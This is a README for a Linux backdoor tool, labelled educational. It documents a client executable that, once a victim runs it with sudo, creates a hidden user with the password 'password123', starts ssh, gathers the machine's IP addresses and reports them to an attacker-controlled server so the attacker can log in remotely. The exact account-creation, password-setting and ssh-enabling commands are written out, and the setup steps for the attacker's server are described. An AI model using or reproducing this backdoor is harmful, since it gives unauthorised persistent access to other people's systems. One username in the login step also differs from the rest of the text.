# BackLin
## Linux Backdoor

## CREATED FOR EDUCATIONAL PURPOSES, USE ONLY FOR EDUCATIONAL PURPOSES

### NOTE: This code requires that the victim enter their password since it requires sudo permissions, this should come off as suspicious to them

All the client code does is:

1. Add a new user named sysusr w/the password password123
2. Open up ssh
3. Grab the system's public & private IP
4. Send the gathered data (the ips, newly created user) to a server the attacker controls 

Compile the client python code with:

```
pyinstaller --clean -F <python-file-path>
```

The server side code is stolen from [here](https://gist.github.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7) 

From my understanding, all the server code does is use Python's simple http server functionality & expands on it to allow it to accept POST requests.

All our client code does is create a new user named sysusr:
```
sudo adduser --quiet --disabled-password --shell /bin/bash --home /home/sysusr/ --gecos "User" sysusr
```
Then it starts up ssh
```
sudo service ssh start
```
Then it adds the password "password123" to our new user:
```
echo 'sysusr:password123' | sudo chpasswd sysusr
```
Now, we do 2 things: grab the public & private IP address of the system & store the output in a variable & suppress the output from the victim:
```
hostname -I &> /dev/null
curl -s http://ifconfig.me &> /dev/null
```

Finally, we check if the user we created exists to make sure everything went smoothly:
```
id sysusr
```

And from line 16 to line 22, we send the data about our system (public ip, private ip, new username, etc) to a webserver where our server code is running.

Now we run the server.py file & then on the victim machine, we run the client executable:

![](/imgs/img.png)

We receive a POST request on our server, which will be logged into a text file:

![](/imgs/img2.png)

On the attacker machine, we attempt to login to the user "usrsys" using the password "password123" & we're successful!

![](/imgs/img3.png)
